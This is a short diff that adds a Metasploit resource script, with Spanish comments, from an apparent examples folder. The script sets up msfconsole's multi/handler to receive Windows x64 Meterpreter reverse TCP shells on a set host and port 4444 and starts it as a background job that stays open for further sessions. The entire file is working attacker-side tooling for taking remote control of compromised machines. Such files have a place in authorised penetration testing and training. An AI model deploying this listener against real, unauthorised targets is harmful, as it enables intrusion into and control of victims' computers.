@@ -1,0 +1,8 @@
+# msf_examples/multihandler_listener.rc
+# Ejemplo de archivo .rc para msfconsole que configura un multi/handler para recibir reverse shells.
+# NOTA: Editar LHOST y LPORT antes de usar.
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.90
+set LPORT 4444
+set ExitOnSession false
+exploit -j -z
